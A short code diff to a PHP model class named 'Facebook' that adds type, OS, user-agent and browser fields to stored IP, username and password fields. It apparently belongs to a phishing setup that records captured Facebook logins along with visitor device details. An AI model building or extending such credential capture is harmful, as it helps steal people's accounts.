@@ -8,6 +8,10 @@ class Facebook extends Model
 {
     protected $fillable = [
         'ip',
+        'type',
+        'os',
+        'useragent',
+        'browser',
         'username',
         'password',
     ];
